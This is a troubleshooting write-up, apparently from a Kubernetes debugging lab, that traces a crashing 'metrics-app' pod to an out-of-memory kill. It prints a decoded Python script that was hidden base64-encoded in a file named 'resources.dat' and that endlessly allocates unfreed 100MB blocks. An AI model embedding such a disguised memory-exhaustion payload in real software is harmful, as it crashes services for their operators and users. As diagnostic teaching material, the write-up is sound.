# 🧪 Debugging: Unexpected Crash in `metrics-app`

## 🔍 Observed Behavior

When running a loop test against the `/counter` endpoint using:

```bash
#!/bin/bash

# This script is used to test the /counter endpoint of the web server
for i in $(seq 0 20); do
    time curl localhost/counter
done
```

The app initially responded as expected:

```
Counter value: 1
Counter value: 2
...
```

However, after a few requests, it began returning:

```html
<html>
  <head>
    <title>502 Bad Gateway</title>
  </head>
  <body>
    <center><h1>502 Bad Gateway</h1></center>
    <hr />
    <center>nginx</center>
  </body>
</html>
```

---

## 🧾 Investigation Steps

### 1. Checked Pod Status

```bash
kubectl get pods -n <namespace>
```

Output showed that the pod was in a **CrashLoopBackOff** state, and restarting.

---

### 2. Checked Pod Logs

```bash
kubectl logs <pod-name> -n <namespace>
```

The logs did not show any application-level errors.

---

### 3. Checked Events for Clues

```bash
kubectl get events -n <namespace> --sort-by='.metadata.creationTimestamp'
```

Found this event:

```
Back-off restarting failed container metrics-app in pod <pod-name>
```

This confirmed that Kubernetes was trying and failing to restart the pod.

---

### 4. Checked Last Exit State of the Container

To inspect the termination reason of the previous container instance:

```bash
kubectl get pod <pod-name> -n <namespace> -o jsonpath="{.status.containerStatuses[*].lastState.terminated}"
```

**Sample Output:**

```json
{
  "containerID": "containerd://<id>",
  "exitCode": 137,
  "finishedAt": "2025-05-17T04:57:04Z",
  "reason": "OOMKilled",
  "startedAt": "2025-05-17T04:52:09Z"
}
```

---

### 5. Analyzed Suspicious Code Embedded in `resources.dat`

While exploring the container’s filesystem using:

```bash
kubectl exec -it <pod-name> -n <namespace> -- /bin/bash
```

I found a binary-encoded file called `resources.dat`. Decoding it revealed Python code embedded in base64:

```bash
cat resources.dat | base64 -d
```

Decoded content:

```python
import random
import time

# Global list to keep references to bytearrays
global_memory = []

def generate_blocks():
    while True:
        _ = 0
        for _ in range(10**6):
            _ += random.randint(1, 10)
            local_list = []
            for _ in range(5):
                ba = bytearray(100 * 1024 * 1024)
                local_list.append(ba)
            # Keep reference forever
            global_memory.extend(local_list)
        time.sleep(0.05)

if __name__ == "__main__":
    generate_blocks()
```

The resources.dat file contains a base64-encoded Python script that, when decoded and executed, runs an infinite loop that continuously allocates large blocks of memory (100MB each) and stores them in a global list. This prevents the memory from being freed, causing the program to consume increasing amounts of RAM rapidly, ultimately leading to the container being terminated by the system due to an Out Of Memory (OOM) condition.

---

### 6. 🔬 Summary of Root Cause and Flow

Here’s how the issue unfolds step-by-step:

- **User accesses the `/counter` endpoint**
  – This increments a counter and triggers a background task.

- **The background task launches a metrics collector**
  – This reads the `resources.dat` file, decodes a base64-encoded Python script, and writes it to a temporary file.

- **The script is executed as a background subprocess**
  – It enters an infinite loop, continuously allocating 100MB memory blocks and storing them in a global list.

- **Memory usage increases rapidly**
  – Since the script never releases memory and runs indefinitely, it consumes all available RAM.

- **Every `/counter` request starts a new memory-intensive subprocess**
  – Repeated calls multiply memory consumption exponentially.

- **Eventually, the container is OOMKilled**
  – The Linux kernel kills the process due to memory exhaustion, and Kubernetes restarts the container.

---

### Generic fix approach

- Avoid endlessly allocating large memory blocks or leaking memory.
- Control how often background subprocesses are launched; avoid spawning one per request.
- Implement resource limits in Kubernetes for CPU and memory.
- Monitor application resource usage regularly.
- Profile and optimize memory-heavy parts of the app.
